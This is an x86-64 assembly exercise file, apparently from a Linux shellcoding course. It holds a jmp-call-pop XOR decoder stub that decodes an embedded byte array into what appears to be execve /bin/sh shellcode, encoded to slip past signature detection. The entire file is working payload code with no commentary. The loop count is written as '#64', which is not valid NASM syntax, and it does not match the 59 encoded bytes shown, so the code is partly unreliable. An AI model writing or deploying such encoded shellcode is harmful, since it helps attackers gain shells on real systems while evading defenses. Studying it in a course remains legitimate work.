; David @InfinitelyManic
; code from course: http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/
;
section .bss
section .data
section .mytext progbits alloc exec write align=16
        global _start
_start:
        nop
        jmp find_address

decoder:
        pop rdi
        xor rcx, rcx
        add cl, #64             ; size of encoded shellcode - loop

decode:
        xor byte [rdi] ,0xaa    ; XOR cipher key
        inc rdi
        loop decode

        jmp short encoded_shellcode

_exit:
        xor rax, rax
        add al, 60
        xor rdi, rdi
        syscall

find_address:
        call decoder
        encoded_shellcode: db \
        0x41,0xb7,0xe2,0x9b,0x6a,0xf5,0x22,0xcd,0xad,0xe2,0x23,0xd5,0xa2,0xe2,0x23,0xed,0xba,0xe2,0x27,0xdd,0xa2,0xe2,0x27,0xfd,0xba,0xe2,0x29,0x6a,0x91,0xa5,0xaf,0x42,0x74,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xd9,0xc2,0xeb,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9
